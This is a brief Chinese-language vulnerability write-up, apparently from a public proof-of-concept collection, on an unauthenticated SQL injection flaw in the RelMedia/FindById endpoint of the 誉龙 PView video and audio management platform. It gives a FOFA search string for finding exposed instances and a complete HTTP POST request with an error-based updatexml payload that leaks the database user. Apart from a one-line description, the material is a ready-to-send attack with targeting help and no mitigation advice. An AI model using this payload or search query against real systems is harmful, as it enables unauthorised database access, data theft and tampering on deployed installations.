# 誉龙视音频综合管理平台FindById存在SQL注入漏洞

誉龙视音频综合管理平台 RelMedia/FindById 存在SQL注入漏洞，未经身份验证的远程攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```javascript
body="PView 视音频管理平台"
```

## poc

```javascript
POST /index.php?r=RelMedia/FindById HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

id=1+and+updatexml(1,concat(0x7e,user(),0x7e),1)--+
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409162102180.png)

